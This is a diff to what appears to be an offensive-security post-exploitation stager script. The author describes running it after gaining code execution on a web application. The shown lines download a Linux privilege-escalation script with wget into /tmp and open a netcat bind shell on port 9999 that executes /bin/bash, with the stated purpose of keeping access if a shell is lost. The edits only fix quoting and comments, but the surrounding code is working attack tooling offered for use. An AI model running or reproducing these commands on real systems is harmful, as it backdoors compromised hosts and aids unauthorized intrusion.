@@ -4,7 +4,7 @@
 # (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)
 
 
-$stage = /tmp
+$stage = "/tmp"
 
 # banner
 echo "[]---------------------------WillChaos Enum/Exploit stager---------------------------------[]"
@@ -27,8 +27,8 @@ wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/linuxpriv
 # build a NC bind shell incase we lose a shell
 echo "[*] Attempting to bind a shell to 9999 incase you lose your shell"
 $stage/nc -nlvp 9999 -e /bin/bash &
-# chill for a szecond
-sleep 2
+# chill for a sec, waits for the script to catch up (this has helped unscrample a lot of shit on semi-broken shells)
+sleep 2s
 
 # semi interactive shell
 echo "[*] Attempting to build semi-interactive shell "
